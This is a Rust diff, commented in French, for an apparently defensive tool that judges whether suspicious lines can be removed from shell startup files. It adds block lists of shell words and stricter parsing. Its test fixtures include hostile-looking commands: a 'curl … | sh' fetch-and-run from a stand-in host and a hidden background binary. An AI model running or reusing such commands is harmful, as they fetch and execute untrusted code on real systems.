@@ -1565,10 +1565,12 @@ pub(crate) fn ligne_suspecte(fichier: &str, ligne: &str) -> bool {
 pub(crate) enum Decoupe {
     /// Elle, ou celle d'avant, finit par « \ » : le shell, systemd et pam_env la joignent à la suivante.
     Barre,
-    /// Dans un fichier lu par un shell : elle n'est pas une commande simple, ou elle touche une construction sur
-    /// plusieurs lignes (`AnalyseDeRetrait::retrait_change_le_shell`).
+    /// Dans un fichier lu par un shell : elle n'est pas de la forme « [export ]NOM=valeur » la plus simple, ou son
+    /// voisinage ou le reste du fichier pourrait faire lire autrement d'autres lignes après son retrait
+    /// (`AnalyseDeRetrait::retrait_change_le_shell`).
     Shell,
-    /// Le fichier a plus de `RETRAIT_LIGNES_MAX` lignes : rien n'est jugé, le retrait est refusé.
+    /// Le fichier a plus de `RETRAIT_LIGNES_MAX` lignes ou de `RETRAIT_OCTETS_MAX` octets : rien n'est jugé, le
+    /// retrait est refusé.
     Trop,
 }
 
@@ -1643,10 +1645,15 @@ struct LigneDeShell {
     /// Elle lit ce que la commande d'avant a laissé (« $? », « $! », « $_ », PIPESTATUS) : retirer la ligne d'avant
     /// lui changerait sa valeur.
     lit_la_precedente: bool,
+    /// Elle porte « << », où que ce soit (entre guillemets, dans « $( » : ronde 6 du lot 096, R6-3).
+    heredoc: bool,
+    /// Elle est de la forme la plus simple (`affectation_simple`) : le NOM qu'elle pose, et combien de fois ce nom
+    /// y paraît (`occurrences_de`).
+    affectation: Option<(Vec<u8>, usize)>,
 }
 
-/// Les mots qui ouvrent ou ferment un bloc du shell (bash, zsh, fish) : une ligne qui en porte un ne se retire pas
-/// seule.
+/// Les mots qui ouvrent ou ferment un bloc du shell (bash, zsh, fish) : la ligne qui suit une ligne finie par l'un
+/// d'eux ne se retire pas seule (`attend`).
 const MOTS_DE_BLOC: [&[u8]; 21] = [
     b"if",
     b"then",
@@ -1671,27 +1678,6 @@ const MOTS_DE_BLOC: [&[u8]; 21] = [
     b"coproc",
 ];
 
-/// Les mots qui changent ce que font les lignes d'après : sortir (« return », « exit », « exec », « logout »,
-/// « break », « continue ») laisse la suite du fichier sans effet, et la retirer la réveille (ronde 5 du lot 096,
-/// N2) ; « eval » lance un texte qu'on ne lit pas ; « alias », « shopt », « setopt » et « emulate » changent la
-/// lecture des lignes d'après. Une ligne qui en porte un ne se retire pas seule.
-const MOTS_QUI_CHANGENT_LA_SUITE: [&[u8]; 14] = [
-    b"return",
-    b"exit",
-    b"exec",
-    b"logout",
-    b"break",
-    b"continue",
-    b"eval",
-    b"alias",
-    b"unalias",
-    b"shopt",
-    b"setopt",
-    b"unsetopt",
-    b"emulate",
-    b"trap",
-];
-
 /// Les mots qui, en fin de ligne, attendent une commande après eux : la ligne qui suit ne se retire pas seule.
 const MOTS_QUI_ATTENDENT: [&[u8]; 4] = [b"in", b"!", b"time", b"{"];
 
@@ -1700,13 +1686,202 @@ const MOTS_QUI_CONTINUENT: [&[u8]; 10] = [
     b"then", b"do", b"fi", b"done", b"elif", b"else", b"esac", b"end", b"always", b"in",
 ];
 
+/// Les commandes qui, présentes n'importe où dans le fichier comme mot du shell (même entre guillemets ou coupées par
+/// « \ » : `"ali"as` est encore « alias »), font refuser le retrait de toutes ses lignes (ronde 6 du lot 096). Chacune
+/// change ce qu'une ligne « export NOM=valeur » fait, ou ce que son retrait change, sans que la ligne le montre (rejoué
+/// avec bash 5) : « alias export=return » fait de la ligne une sortie, son retrait réveille la suite ; « readonly »,
+/// « declare -r », « typeset -r » ou « local -r » la font échouer, et l'échec arrête le shell (mode POSIX, « set -e ») ;
+/// « trap … DEBUG » la voit passer ; « eval » lance un texte qu'on ne lit pas ; « enable -n » (bash) et « disable »
+/// (zsh) retirent la commande interne « export » ; « functions » (zsh) définit une fonction. Un mot du shell, pas un
+/// bout de chemin : « /usr/local/bin » ne fait pas refuser.
+const MOTS_QUI_REFUSENT_LE_FICHIER: [&[u8]; 10] = [
+    b"alias",
+    b"eval",
+    b"trap",
+    b"readonly",
+    b"declare",
+    b"typeset",
+    b"local",
+    b"enable",
+    b"disable",
+    b"functions",
+];
+
+/// Les variables qui, nommées n'importe où dans le fichier, font refuser le retrait de toutes ses lignes : « $LINENO »
+/// change de valeur pour toutes les lignes d'après, « PS4 » se développe avant chaque commande tracée, et
+/// « BASH_COMMAND » montre la commande en cours (rejoué avec bash 5 pour LINENO).
+const NOMS_QUI_REFUSENT_LE_FICHIER: [&[u8]; 3] = [b"LINENO", b"PS4", b"BASH_COMMAND"];
+
+/// Les variables que le shell lit lui-même pour lire ou lancer les lignes d'après (découpe des mots, recherche des
+/// commandes, mode POSIX, langue, « ~ ») : une ligne qui en pose une ne se retire pas seule, son retrait changerait
+/// d'autres lignes sans qu'elles la nomment (ronde 6 du lot 096 : « IFS=x » retiré réveille une ligne, rejoué avec
+/// bash 5). Celles qui commencent par « BASH_ » ou « LC_ » aussi.
+const NOMS_DU_SHELL: [&[u8]; 19] = [
+    b"IFS",
+    b"PATH",
+    b"ENV",
+    b"CDPATH",
+    b"GLOBIGNORE",
+    b"POSIXLY_CORRECT",
+    b"SHELLOPTS",
+    b"BASHOPTS",
+    b"PS4",
+    b"FUNCNEST",
+    b"HOME",
+    b"LANG",
+    b"OPTIND",
+    b"OPTERR",
+    b"TMOUT",
+    b"EXECIGNORE",
+    b"SHELL",
+    b"FPATH",
+    b"ZDOTDIR",
+];
+
+/// Au plus autant de constructions ouvertes l'une dans l'autre (guillemets, « $( », « ${ ») que suit `decoupe_de_shell` ;
+/// au-delà, le reste du fichier est dans le doute (refus). Un vrai fichier de démarrage n'en ouvre jamais tant ; sans
+/// borne, 32 Mio de « "$( » demandaient 385 Mo au bilan (ronde 6 du lot 096, R6-4).
+const PILE_MAX: usize = 64;
+
+/// Les octets admis, hors guillemets, dans la valeur d'une ligne de la forme la plus simple (`affectation_simple`) :
+/// lettres et chiffres ASCII et « / . _ - : + , = @ % », qui ne sont spéciaux pour le shell dans aucune construction.
+fn octet_simple(o: u8) -> bool {
+    o.is_ascii_alphanumeric() || b"/._-:+,=@%".contains(&o)
+}
+
+/// La ligne est-elle de la forme la plus simple, « [export ]NOM=valeur », seule (ronde 6 du lot 096 : trois rondes
+/// ont trouvé des trous dans une analyse plus large du shell) ? Le NOM qu'elle pose, sinon `None`. Admis :
+/// - des blancs (espace, tabulation) en tête ; « export » suivi de blancs ; un NOM de lettres ASCII, chiffres et « _ »
+///   (pas en tête un chiffre), hors `NOMS_DU_SHELL` ;
+/// - une valeur faite de `octet_simple` et de morceaux entre guillemets simples ou doubles, fermés sur la ligne, dont
+///   le dedans n'a que des `octet_simple`, espaces et tabulations ;
+/// - puis des blancs, et peut-être un commentaire (« # » après un blanc) sans guillemet, « $ », accent grave ni « \ ».
+///
+/// Rien d'autre : ni « & | ; ( ) { } < > $ ` \ » hors de ces guillemets, ni seconde commande, ni « \r ». Une telle
+/// ligne garde le même sens où qu'elle soit lue (dans un guillemet, une substitution, un heredoc ouvert plus haut) et
+/// ne change l'état d'aucune construction : chaque guillemet qu'elle ouvre, elle le ferme, sans autre octet spécial.
+fn affectation_simple(ligne: &[u8]) -> Option<&[u8]> {
+    let blanc = |o: &u8| *o == b' ' || *o == b'\t';
+    let sans_blancs = |r: &'_ [u8]| -> usize { r.iter().position(|o| !blanc(o)).unwrap_or(r.len()) };
+    let mut reste = ligne.get(sans_blancs(ligne)..)?;
+    if let Some(apres) = reste.strip_prefix(b"export")
+        && apres.first().is_some_and(blanc)
+    {
+        reste = apres.get(sans_blancs(apres)..)?;
+    }
+    let fin_du_nom = reste.iter().position(|o| !(o.is_ascii_alphanumeric() || *o == b'_'))?;
+    let (nom, apres) = reste.split_at(fin_du_nom);
+    if nom.first().is_none_or(u8::is_ascii_digit)
+        || NOMS_DU_SHELL.contains(&nom)
+        || nom.starts_with(b"BASH_")
+        || nom.starts_with(b"LC_")
+    {
+        return None;
+    }
+    let mut valeur = apres.strip_prefix(b"=")?;
+    loop {
+        match valeur.split_first() {
+            None => return Some(nom),
+            Some((&q @ (b'\'' | b'"'), dedans)) => {
+                let fin = dedans.iter().position(|o| *o == q)?;
+                let (morceau, apres) = dedans.split_at(fin);
+                if !morceau.iter().all(|o| octet_simple(*o) || blanc(o)) {
+                    return None;
+                }
+                valeur = apres.get(1..)?;
+            }
+            Some((o, suite)) if octet_simple(*o) => valeur = suite,
+            Some((o, _)) if blanc(o) => break,
+            Some(_) => return None,
+        }
+    }
+    let fin = valeur.get(sans_blancs(valeur)..)?;
+    match fin.first() {
+        None => Some(nom),
+        Some(b'#') => (!fin.iter().any(|o| b"'\"`$\\\r".contains(o))).then_some(nom),
+        Some(_) => None,
+    }
+}
+
+/// Les mots d'identifiant de `octets` (lettres ASCII, chiffres, « _ »), avec leur début dans `octets`.
+fn identifiants(octets: &[u8]) -> impl Iterator<Item = (usize, &[u8])> {
+    let mut debut = 0usize;
+    octets
+        .split(|o| !(o.is_ascii_alphanumeric() || *o == b'_'))
+        .map(move |m| {
+            let d = debut;
+            debut = debut.saturating_add(m.len()).saturating_add(1);
+            (d, m)
+        })
+        .filter(|(_, m)| !m.is_empty())
+}
+
+/// `octets` sans guillemets ni « \ » : `"ali"as`, `ex\it` et `'LD_'PRELOAD` s'y lisent comme le shell les lit après
+/// avoir ôté les guillemets.
+fn sans_guillemets(octets: &[u8]) -> Vec<u8> {
+    octets.iter().copied().filter(|o| !b"'\"\\".contains(o)).collect()
+}
+
+/// Combien de fois `nom` paraît comme mot dans `octets` tel quel, plus dans `octets` sans guillemets : « "$X"y » nomme
+/// X, « X"" » aussi. Compté de la même façon pour le fichier et pour ses lignes retirées.
+fn occurrences_de(nom: &[u8], octets: &[u8]) -> usize {
+    let nu = sans_guillemets(octets);
+    identifiants(octets)
+        .chain(identifiants(&nu))
+        .filter(|(_, m)| *m == nom)
+        .count()
+}
+
+/// Les mots du shell de `octets` : coupés aux blancs, aux fins de ligne et aux opérateurs (« ; & | ( ) { } < > » et
+/// accent grave), avec leur début dans `octets`.
+fn mots_du_fichier(octets: &[u8]) -> impl Iterator<Item = (usize, &[u8])> {
+    let mut debut = 0usize;
+    octets
+        .split(|o| b" \t\r\n;&|(){}<>`".contains(o))
+        .map(move |m| {
+            let d = debut;
+            debut = debut.saturating_add(m.len()).saturating_add(1);
+            (d, m)
+        })
+        .filter(|(_, m)| !m.is_empty())
+}
+
+/// Le fichier fait-il refuser tout retrait ? Oui s'il porte une commande de `MOTS_QUI_REFUSENT_LE_FICHIER` (mot du
+/// shell, tel quel ou sans guillemets), un nom de `NOMS_QUI_REFUSENT_LE_FICHIER`, une chaîne « $'…' » (ses « \x61 »
+/// écrivent n'importe quel mot : `$'\x61lias'` lance « alias »), ou s'il définit une fonction « export »
+/// (« export() », « function export »). `nu` : le fichier sans guillemets (`sans_guillemets`).
+fn fichier_qui_refuse(contenu: &[u8], nu: &[u8]) -> bool {
+    let apres_les_blancs = |d: usize| -> &[u8] {
+        let r = nu.get(d..).unwrap_or_default();
+        r.get(r.iter().position(|o| *o != b' ' && *o != b'\t').unwrap_or(r.len())..)
+            .unwrap_or_default()
+    };
+    contenu.windows(2).any(|w| w == b"$'")
+        || mots_du_fichier(contenu)
+            .chain(mots_du_fichier(nu))
+            .any(|(_, m)| MOTS_QUI_REFUSENT_LE_FICHIER.contains(&m))
+        || identifiants(contenu)
+            .chain(identifiants(nu))
+            .any(|(_, m)| NOMS_QUI_REFUSENT_LE_FICHIER.contains(&m))
+        || identifiants(nu).any(|(d, m)| {
+            let fin = d.saturating_add(m.len());
+            (m == b"export" && apres_les_blancs(fin).first() == Some(&b'('))
+                || (m == b"function"
+                    && identifiants(apres_les_blancs(fin))
+                        .next()
+                        .is_some_and(|(debut, mot)| debut == 0 && mot == b"export"))
+        })
+}
+
 /// Les lignes de `contenu` (coupées au seul « \n »), lues comme le shell : guillemets simples, doubles, « $'…' »,
 /// accents graves, « $(…) » (parenthèses comptées) et « ${…} » suivis d'une ligne à l'autre et imbriqués comme le
 /// shell les imbrique (un guillemet dans « "$( … )" » est à la substitution, pas au guillemet du dehors : ronde 5 du
 /// lot 096, N2 cas 3) ; « \ » qui protège l'octet suivant ; « # » en début de mot qui ouvre un commentaire jusqu'au
 /// bout de la ligne ; « [[ » et « (( » comptés d'une ligne à l'autre. Lecture prudente, pas un shell : un « case »
-/// dans une substitution (ses « motif) » ferment mal les parenthèses) met tout le reste du fichier dans le doute,
-/// donc en refus.
+/// dans une substitution (ses « motif) » ferment mal les parenthèses), ou plus de `PILE_MAX` constructions ouvertes
+/// l'une dans l'autre, mettent tout le reste du fichier dans le doute, donc en refus. Le lecteur ne sert qu'à savoir
+/// si une ligne est lue hors de toute construction, et ce qui finit la ligne d'avant et commence celle d'après : la
+/// ligne retirée, elle, est de la forme la plus simple (`affectation_simple`), sans octet que ce lecteur suive.
 fn decoupe_de_shell(contenu: &[u8]) -> Vec<LigneDeShell> {
     #[derive(Clone, Copy, PartialEq, Eq)]
     enum Cadre {
@@ -1867,6 +2042,12 @@ fn decoupe_de_shell(contenu: &[u8]) -> Vec<LigneDeShell> {
                     }
                 }
             }
+            // R6-4 : une pile bornée ; au-delà, tout le reste du fichier est dans le doute (refus), sans plus rien
+            // garder en mémoire.
+            if pile.len() > PILE_MAX {
+                doute = true;
+                pile.clear();
+            }
             avant = o;
         }
         doubles = doubles
@@ -1883,6 +2064,8 @@ fn decoupe_de_shell(contenu: &[u8]) -> Vec<LigneDeShell> {
             code,
             barre: ligne.trim_ascii_end().ends_with(b"\\"),
             lit_la_precedente,
+            heredoc: ligne.windows(2).any(|w| w == b"<<"),
+            affectation: affectation_simple(ligne).map(|nom| (nom.to_vec(), occurrences_de(nom, ligne))),
         });
     }
     lignes
@@ -1896,35 +2079,49 @@ fn mots_de_shell(code: &[u8]) -> impl Iterator<Item = &[u8]> {
 
 /// Un fichier découpé une fois, pour juger le retrait de lignes seules (ronde 5 du lot 096, N1) : avant, chaque
 /// ligne signalée relisait tout le fichier, et chaque ligne jugée remontait le fichier pour trouver sa voisine ; un
-/// fichier de lignes pareilles coûtait N⁴ (800 lignes : 30 s, sans droit root). Ici, la découpe et les voisines se
-/// calculent en un passage ; un jugement coûte ensuite autant que ses numéros. Au-delà de `RETRAIT_LIGNES_MAX`
-/// lignes, rien n'est découpé et tout retrait est refusé.
+/// fichier de lignes pareilles coûtait N⁴ (800 lignes : 30 s, sans droit root). Ici, la découpe, les voisines, les
+/// mots du fichier et le compte des noms se calculent en quelques passages ; un jugement coûte ensuite autant que ses
+/// numéros (et la longueur de leurs lignes). Au-delà de `RETRAIT_LIGNES_MAX` lignes ou de `RETRAIT_OCTETS_MAX`
+/// octets, rien n'est découpé et tout retrait est refusé.
 pub(crate) struct AnalyseDeRetrait {
     /// Un fichier qu'un shell, pam_env ou systemd lit comme des variables (tout fichier sauf `lu_ligne_par_ligne`).
     shell: bool,
-    /// Plus de `RETRAIT_LIGNES_MAX` lignes : rien n'est jugé.
+    /// Trop de lignes ou d'octets : rien n'est jugé.
     trop: bool,
+    /// Le fichier porte un mot qui fait refuser tout retrait (`fichier_qui_refuse`).
+    refuse: bool,
     lignes: Vec<LigneDeShell>,
-    /// Un heredoc (« << ») sur la ligne, ou plus haut.
+    /// Un heredoc (« << », où que ce soit) sur la ligne, ou plus haut.
     heredoc: Vec<bool>,
     /// La ligne pleine (du code, ou dans une construction ouverte) la plus proche avant chaque ligne, et après.
     precedente: Vec<Option<usize>>,
     suivante: Vec<Option<usize>>,
+    /// Pour chaque NOM posé par une ligne de la forme la plus simple : combien de fois il paraît dans le fichier
+    /// (`occurrences_de`).
+    noms: HashMap<Vec<u8>, usize>,
 }
+
+/// Au plus autant d'octets dans un fichier dont Vanguard juge le retrait d'une ligne seule ; au-delà, refus
+/// (`Decoupe::Trop`). Le fils root n'en lit jamais tant (512 Kio) ; le bilan lit jusqu'à 32 Mio : la borne tient la
+/// mémoire du jugement à quelques fois ce que dit la borne (ronde 6 du lot 096, R6-4).
+pub(crate) const RETRAIT_OCTETS_MAX: usize = 4 * 1024 * 1024;
 
 impl AnalyseDeRetrait {
     /// L'analyse de `fichier`, de contenu `contenu`.
     pub(crate) fn de(fichier: &str, contenu: &[u8]) -> Self {
         let shell = !lu_ligne_par_ligne(fichier);
-        if contenu.split(|o| *o == b'\n').nth(RETRAIT_LIGNES_MAX).is_some() {
-            return Self {
-                shell,
-                trop: true,
-                lignes: Vec::new(),
-                heredoc: Vec::new(),
-                precedente: Vec::new(),
-                suivante: Vec::new(),
-            };
+        let mut analyse = Self {
+            shell,
+            trop: true,
+            refuse: false,
+            lignes: Vec::new(),
+            heredoc: Vec::new(),
+            precedente: Vec::new(),
+            suivante: Vec::new(),
+            noms: HashMap::new(),
+        };
+        if contenu.len() > RETRAIT_OCTETS_MAX || contenu.split(|o| *o == b'\n').nth(RETRAIT_LIGNES_MAX).is_some() {
+            return analyse;
         }
         let lignes = decoupe_de_shell(contenu);
         let pleine = |l: &LigneDeShell| !l.code.trim_ascii().is_empty() || l.commence_dedans;
@@ -1932,13 +2129,17 @@ impl AnalyseDeRetrait {
         let mut vu = false;
         let mut precedente = Vec::with_capacity(lignes.len());
         let mut derniere = None;
+        let mut noms: HashMap<Vec<u8>, usize> = HashMap::new();
         for (i, l) in lignes.iter().enumerate() {
             pas_de_retrait();
-            vu = vu || l.code.windows(2).any(|w| w == b"<<");
+            vu = vu || l.heredoc;
             heredoc.push(vu);
             precedente.push(derniere);
             if pleine(l) {
                 derniere = Some(i);
+            }
+            if let Some((nom, _)) = &l.affectation {
+                noms.entry(nom.clone()).or_insert(0);
             }
         }
         let mut suivante = vec![None; lignes.len()];
@@ -1952,14 +2153,23 @@ impl AnalyseDeRetrait {
                 prochaine = Some(i);
             }
         }
-        Self {
-            shell,
-            trop: false,
-            lignes,
-            heredoc,
-            precedente,
-            suivante,
+        // Un passage sur les mots du fichier, tel quel et sans guillemets, pour les noms posés (ronde 6 du lot 096).
+        let nu = sans_guillemets(contenu);
+        if !noms.is_empty() {
+            for (_, m) in identifiants(contenu).chain(identifiants(&nu)) {
+                if let Some(n) = noms.get_mut(m) {
+                    *n = n.saturating_add(1);
+                }
+            }
         }
+        analyse.trop = false;
+        analyse.refuse = fichier_qui_refuse(contenu, &nu);
+        analyse.lignes = lignes;
+        analyse.heredoc = heredoc;
+        analyse.precedente = precedente;
+        analyse.suivante = suivante;
+        analyse.noms = noms;
+        analyse
     }
 
     /// Retirer les lignes `numeros` (depuis 0, coupées au seul « \n ») changerait-il le sens d'une AUTRE ligne ?
@@ -1968,7 +2178,7 @@ impl AnalyseDeRetrait {
     ///   d'après, qui n'était qu'un argument (ronde 4 du lot 096, G34-1). Jugé même pour les fichiers dont le lecteur
     ///   ne joint rien (cron, fichiers à clés) : un refus de trop laisse le geste à la main.
     /// - Pour un fichier lu par un shell : `retrait_change_le_shell` (`Decoupe::Shell`).
-    /// - Plus de `RETRAIT_LIGNES_MAX` lignes : `Decoupe::Trop`, jamais un retrait admis sans jugement.
+    /// - Trop de lignes ou d'octets : `Decoupe::Trop`, jamais un retrait admis sans jugement.
     pub(crate) fn decoupe(&self, numeros: &[usize]) -> Option<Decoupe> {
         if self.trop {
             return Some(Decoupe::Trop);
@@ -1983,59 +2193,78 @@ impl AnalyseDeRetrait {
         (self.shell && self.retrait_change_le_shell(numeros)).then_some(Decoupe::Shell)
     }
 
-    /// Retirer les lignes `numeros` d'un fichier lu par un shell changerait-il la lecture d'une autre ligne ? Garde
-    /// prudente (ronde 5 du lot 096, N2 : une liste de cas refusés ne peut pas être complète) : une ligne ne se retire
-    /// seule que si elle est une commande simple, loin de toute construction sur plusieurs lignes. Oui, donc, si
-    /// l'une d'elles :
-    /// - commence ou finit dans une construction ouverte (`decoupe_de_shell`) : « export X="a » ouvre un guillemet que
-    ///   ferme une ligne plus bas ; la retirer fait lancer les lignes d'entre les deux, qui n'étaient que du texte ;
-    /// - suit un heredoc (« << », même plus haut) : retirer « cat >/dev/null <<EOF » fait lancer son corps ;
-    /// - n'est pas une commande simple : « ; », parenthèse ou accolade (« P; f() », bras de case « (a) P ;; »),
-    ///   « [[ », un mot de bloc (`MOTS_DE_BLOC`) ou un mot qui change la suite (`MOTS_QUI_CHANGENT_LA_SUITE` :
-    ///   « P; return » retiré réveille le reste du fichier), ou une fin par « | », « |& », « || » ou « && » ;
-    /// - suit (lignes vides et commentaires sautés) une ligne qui attend une commande :
-    ///   fin par « | » ou « && », par « ( », « { », « () », « ;; », par un bras de case « motif) », par un mot de bloc
-    ///   ou un mot de `MOTS_QUI_ATTENDENT`, ou qui commence par « function » (« if » / P / « then » : retirer P laisse « if then », erreur de syntaxe,
-    ///   et bash cesse alors de lire le fichier : « . /etc/profile » perdrait la suite, réglages de sécurité compris) ;
-    /// - précède une ligne qui continue ce qui précède (`MOTS_QUI_CONTINUENT`, « } », « ) », « ]] », « )) »,
-    ///   « ;; », « | », « && ») ou qui lit ce que la commande d'avant laisse (« $? », « $! »).
+    /// Retirer les lignes `numeros` d'un fichier lu par un shell changerait-il la lecture d'une autre ligne ? Règle
+    /// de la ronde 6 du lot 096 : trois rondes ont trouvé des trous dans une analyse plus large du shell (un mot de
+    /// sortie entre guillemets, « ${X:?} », un heredoc caché dans « $( »…) ; seule la forme la plus simple se retire
+    /// seule. Oui, donc (refus), si l'une d'elles :
+    /// - n'est pas de la forme « [export ]NOM=valeur » la plus simple (`affectation_simple`) ;
+    /// - commence dans une construction ouverte plus haut (guillemet, « $( », « [[ »… : `decoupe_de_shell`) ;
+    /// - est sous un heredoc (« << » sur une ligne d'avant, même entre guillemets ou dans « $( ») : retirer la ligne
+    ///   qui le ferme ferait lire la suite comme du texte, ou l'inverse ;
+    /// - suit (lignes vides et commentaires sautés) une ligne qui attend une commande (`attend` : « if » / P / « then »
+    ///   laisse « if then », erreur de syntaxe, et bash cesse alors de lire le fichier) ;
+    /// - précède une ligne qui continue ce qui précède, lit ce que la commande d'avant laisse (« $? »), ou se poursuit
+    ///   sur la ligne d'après (`continue_`) ;
+    /// - est la dernière ligne pleine du fichier (lignes retirées sautées) après une ligne gardée qui n'est pas de la
+    ///   forme la plus simple : le code de sortie du fichier lu changerait ;
+    /// - pose un NOM qui paraît ailleurs dans le fichier (« [ -n "$LD_PRELOAD" ] && return » : la retirer réveille
+    ///   la suite), hors des autres lignes retirées ;
+    /// - est dans un fichier qui porte un mot de `MOTS_QUI_REFUSENT_LE_FICHIER` ou définit « export » (`fichier_qui_refuse`).
     fn retrait_change_le_shell(&self, numeros: &[usize]) -> bool {
         // Les voisines se prennent telles quelles, même si elles partent aussi : dans une suite de lignes retirées,
-        // la première voit la ligne gardée d'avant et la dernière celle d'après ; une voisine retirée est une
-        // commande simple, qui n'attend ni ne continue rien. Un pas par numéro.
+        // la première voit la ligne gardée d'avant et la dernière celle d'après ; une voisine retirée est de la forme
+        // la plus simple, qui n'attend ni ne continue rien. Un pas par numéro.
         let ligne = |i: Option<usize>| i.and_then(|i| self.lignes.get(i));
-        numeros.iter().any(|n| {
+        let vus: std::collections::HashSet<usize> =
+            numeros.iter().copied().filter(|n| *n < self.lignes.len()).collect();
+        let mut retires: HashMap<&[u8], usize> = HashMap::new();
+        for n in &vus {
             pas_de_retrait();
             let Some(l) = self.lignes.get(*n) else {
-                return false;
+                continue;
             };
-            !simple(l)
+            let Some((nom, sur_la_ligne)) = &l.affectation else {
+                return true;
+            };
+            if self.refuse
+                || l.commence_dedans
                 || self.heredoc.get(*n).copied().unwrap_or(true)
                 || ligne(self.precedente.get(*n).copied().flatten()).is_some_and(attend)
                 || ligne(self.suivante.get(*n).copied().flatten()).is_some_and(continue_)
-        })
+            {
+                return true;
+            }
+            let compte = retires.entry(nom.as_slice()).or_insert(0);
+            *compte = compte.saturating_add(*sur_la_ligne);
+            // La dernière ligne pleine donne au fichier lu son code de sortie (« . fichier || … », « set -e » de
+            // celui qui le lit) : une affectation rend 0, la commande gardée d'avant peut rendre autre chose. Les
+            // lignes retirées d'avant sautées : chacune ne compte qu'une fois sur tout le jugement.
+            if self.suivante.get(*n).copied().flatten().is_none() {
+                let mut p = self.precedente.get(*n).copied().flatten();
+                while let Some(i) = p.filter(|i| vus.contains(i)) {
+                    pas_de_retrait();
+                    p = self.precedente.get(i).copied().flatten();
+                }
+                if ligne(p).is_some_and(|l| l.affectation.is_none()) {
+                    return true;
+                }
+            }
+        }
+        retires
+            .iter()
+            .any(|(nom, retire)| self.noms.get(*nom).copied().unwrap_or(0) > *retire)
     }
 }
 
 /// La ligne finit par « | », « |& », « || » ou « && » : la ligne d'après en est la suite.
 fn suite(l: &LigneDeShell) -> bool {
     let fin = l.code.trim_ascii_end();
-    fin.ends_with(b"|") || fin.ends_with(b"&&")
-}
-
-/// Une commande simple, entière sur sa ligne : hors de toute construction ouverte, sans « ; », parenthèse, accolade
-/// ni « [[ », sans mot de bloc ni mot qui change la suite, sans fin qui la lie à la ligne d'après.
-fn simple(l: &LigneDeShell) -> bool {
-    !l.commence_dedans
-        && !l.finit_dedans
-        && !l.code.iter().any(|o| b";(){}".contains(o))
-        && !l.code.windows(2).any(|w| w == b"[[" || w == b"]]")
-        && !suite(l)
-        && !mots_de_shell(&l.code).any(|m| MOTS_DE_BLOC.contains(&m) || MOTS_QUI_CHANGENT_LA_SUITE.contains(&m))
+    fin.ends_with(b"|") || fin.ends_with(b"|&") || fin.ends_with(b"&&")
 }
 
 /// La ligne d'avant attend une commande après elle (`AnalyseDeRetrait::retrait_change_le_shell`) ; « function f »
-/// attend son corps.
+/// attend son corps. Une ligne d'avant qui finit dans une construction ouverte n'est pas regardée ici : la ligne
+/// jugée commence alors dedans, et c'est déjà un refus.
 fn attend(l: &LigneDeShell) -> bool {
     let fin = l.code.trim_ascii_end();
     let compte = |c: u8| {
@@ -2043,8 +2272,7 @@ fn attend(l: &LigneDeShell) -> bool {
             .iter()
             .fold(0usize, |n, o| n.saturating_add(usize::from(*o == c)))
     };
-    l.finit_dedans
-        || suite(l)
+    suite(l)
         || [&b"("[..], b"{", b"()", b";;", b";&", b";|"]
             .iter()
             .any(|f| fin.ends_with(f))
@@ -2055,12 +2283,15 @@ fn attend(l: &LigneDeShell) -> bool {
         || mots_de_shell(fin).next() == Some(&b"function"[..])
 }
 
-/// La ligne d'après continue ce qui précède, ou lit ce que la commande d'avant laisse
-/// (`AnalyseDeRetrait::retrait_change_le_shell`).
+/// La ligne d'après continue ce qui précède, lit ce que la commande d'avant laisse, ou se poursuit sur la ligne
+/// suivante (« \ » final, construction ouverte : « true \ » / « && [ $? = 0 ] » lit le code de la ligne retirée,
+/// ronde 6 du lot 096, R6-5) (`AnalyseDeRetrait::retrait_change_le_shell`). Elle ne peut pas commencer dans une
+/// construction : la ligne retirée, de la forme la plus simple, n'en laisse aucune ouverte.
 fn continue_(l: &LigneDeShell) -> bool {
     let debut = l.code.trim_ascii_start();
-    l.commence_dedans
-        || l.lit_la_precedente
+    l.lit_la_precedente
+        || l.barre
+        || l.finit_dedans
         || [&b"}"[..], b")", b"]]", b";;", b"|", b"&&"]
             .iter()
             .any(|d| debut.starts_with(d))
@@ -3000,6 +3231,17 @@ mod tests {
             (format!("{p}\n|| echo REVEILLEE\n"), 0),
             // Un « case » dans une substitution : le reste du fichier est dans le doute.
             (format!("X=$(case a in a) echo;; esac)\n{p}\n"), 1),
+            (format!("X=$(case a in a) echo;; esac); :\n{p}\necho fin\n"), 1),
+            // Une « ) » non appariée finit la ligne d'avant (un motif de case) : prudence, la ligne d'après est
+            // ordinaire.
+            (format!("case a in\na)\n{p}\necho b ;;\nesac\n"), 2),
+            // Ronde 6 : des lignes qui n'ont pas la forme la plus simple, même seules (avant, admises sous la règle de
+            // la commande simple) : une substitution, une commande en fond ou dans un tube, un commentaire à
+            // guillemet.
+            ("export X=\"$(cat /tmp/.x/y)\"\n".to_string(), 0),
+            ("nohup /tmp/.x/a >/dev/null 2>&1 &\necho fin\n".to_string(), 0),
+            ("curl -s http://exemple.invalid/x | sh\necho fin\n".to_string(), 0),
+            (format!("A='x # y'\n{p} # l'agent\n"), 1),
         ] {
             assert_eq!(
                 retrait_decoupe(sh, contenu.as_bytes(), &[n]),
@@ -3011,14 +3253,10 @@ mod tests {
             (format!("umask 077\n{p}\necho fin\n"), 1),
             (format!("if true; then\n  echo a\n  {p}\n  echo b\nfi\n"), 2),
             (format!("# Don't touch\n{p}\n"), 1),
-            (format!("echo \"l'été\"\n{p}\n"), 1),
-            (format!("A='x # y'\n{p} # l'agent\n"), 1),
-            (format!("[ -x /tmp/.x/a ] && /tmp/.x/a\n{p}\n"), 1),
-            (format!("echo ${{HOME}}\n{p}\n"), 1),
-            (format!("X=\"$(echo ')' \"b\")\"\n{p}\n"), 1),
-            ("export X=\"$(cat /tmp/.x/y)\"\n".to_string(), 0),
-            ("nohup /tmp/.x/a >/dev/null 2>&1 &\necho fin\n".to_string(), 0),
-            ("curl -s http://exemple.invalid/x | sh\necho fin\n".to_string(), 0),
+            (format!("echo \"l'été\"\n{p}\necho fin\n"), 1),
+            (format!("[ -x /tmp/.x/a ] && /tmp/.x/a\n{p}\necho fin\n"), 1),
+            (format!("echo ${{HOME}}\n{p}\necho fin\n"), 1),
+            (format!("X=\"$(echo ')' \"b\")\"\n{p}\necho fin\n"), 1),
         ] {
             assert_eq!(
                 retrait_decoupe(sh, contenu.as_bytes(), &[n]),
@@ -3057,9 +3295,135 @@ mod tests {
         assert_eq!(retrait_decoupe(sh, fin.as_bytes(), &[1, 2]), Some(Decoupe::Shell));
         let loin = format!("umask 077\n{p}\n\n# note\n{p}\necho b\n");
         assert_eq!(retrait_decoupe(sh, loin.as_bytes(), &[4, 1]), None);
